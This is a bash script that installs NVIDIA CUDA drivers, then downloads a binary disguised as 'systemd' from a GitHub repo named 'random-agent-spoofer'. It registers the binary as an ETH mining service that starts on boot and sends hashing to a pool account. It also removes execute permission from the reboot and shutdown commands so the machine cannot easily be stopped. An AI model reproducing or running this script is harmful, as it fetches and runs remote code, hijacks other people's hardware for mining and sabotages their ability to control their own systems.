SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	
	date "+%d-%m-%y" >> name
	name=`cat "name"`
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
	sudo apt-get update
	sudo apt-get -y install cuda-drivers --allow-unauthenticated
	sudo apt-get install libcurl3 -y
	sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/v2.0/systemd
	sudo chmod +x systemd
	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/systemd -a ethash -o  stratum+tcp://ethash.poolbinance.com:443 -u trangtrau.001 -p 123456 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
	rm -rf name
	date "+%H%M-%d%m" >> name
	index=`cat "name"`
		
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service
	sudo chmod -x /sbin/reboot
	sudo chmod -x /sbin/shutdown
else
	sudo systemctl start eth.service
	sudo chmod -x /sbin/reboot
	sudo chmod -x /sbin/shutdown
fi
